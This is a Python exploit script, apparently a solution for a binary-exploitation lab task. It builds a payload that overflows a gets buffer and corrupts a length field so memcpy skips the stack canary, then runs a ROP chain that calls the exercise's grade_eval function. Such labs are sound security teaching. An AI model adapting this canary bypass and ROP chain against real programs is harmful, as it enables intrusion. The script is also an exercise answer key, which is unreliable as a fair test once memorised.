#!/usr/bin/env python3
"""Task 7: 绕过 canary —— 为 attack/dark-log 生成 payload。

gets 溢出把 log_frame.len 改成 0xa8，memcpy 的目的地址变成
rbp+8，跳过 rbp-0x8 的 canary；链从 expression[0] 开始，被复制
到返回地址槽后依次执行 pop rdi; 4; ret; grade_eval。
grade_eval 返回后跳到 0，进程以 SIGSEGV 结束（输出已 fflush）。
"""
import struct
import sys


def p64(v):
    return struct.pack("<Q", v)


payload = (
    p64(0x4018A3)          # pop rdi; ret
    + p64(4)               # rdi = 4
    + p64(0x401526)        # ret，对齐
    + p64(0x401677)        # grade_eval
    + p64(0)               # grade_eval 返回后跳到 0
    + b"\x90" * (128 - 40)
    + b"\x90" * 128        # logMsg 区域，凑到 len 字段
    + struct.pack("<I", 0xA8)   # len = 0xa8，让 memcpy 写到 rbp+8
)

assert len(payload) == 260

sys.stdout.buffer.write(payload)
